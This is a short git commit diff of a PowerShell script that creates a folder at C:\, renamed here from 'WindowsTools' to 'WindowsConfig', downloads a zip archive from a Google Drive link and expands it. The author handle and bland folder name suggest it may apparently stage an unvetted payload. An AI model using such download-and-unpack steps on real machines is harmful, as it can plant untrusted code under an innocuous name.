9c51ca9ff54c2de2ff9b9c22a151a35447aa00fd
just-a-hacker <96227476+just-a-hacker@users.noreply.github.com>
2022-06-12 17:18:34 +0200

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,6 +1,6 @@
 cd C:\
-mkdir WindowsTools
-cd WindowsTool
+mkdir WindowsConfig
+cd WindowsConfig
 Invoke-WebRequest -Uri 'https://drive.google.com/u/0/uc?id=18L1r6uOirWGVFB39vThRWrIWKwZAl57j&export=download' -OutFile dist.zip
 Expand-Archive .\dist.zip -DestinationPath dist
 rm dist.zip
